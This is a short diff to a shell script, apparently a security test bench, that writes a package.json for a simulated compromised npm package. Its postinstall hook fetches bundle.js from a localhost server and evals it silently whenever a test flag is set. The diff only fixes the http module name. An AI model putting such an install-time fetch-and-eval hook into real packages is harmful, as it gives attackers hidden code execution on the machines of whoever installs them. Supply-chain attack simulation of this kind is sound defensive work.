@@ -202,7 +202,7 @@ if [ ! -f "compromised-package/data-processor/package.json" ]; then
     "url": "https://github.com/example/data-processor"
   },
   "scripts": {
-    "postinstall": "node -e \"if(process.env.TESTBENCH_MODE==='enabled'){require('https').get('http://localhost:3000/bundle.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{try{eval(d)}catch(e){}})}).on('error',()=>{})}\""
+    "postinstall": "node -e \"if(process.env.TESTBENCH_MODE==='enabled'){require('http').get('http://localhost:3000/bundle.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{try{eval(d)}catch(e){}})}).on('error',()=>{})}\""
   }
 }
 EOF
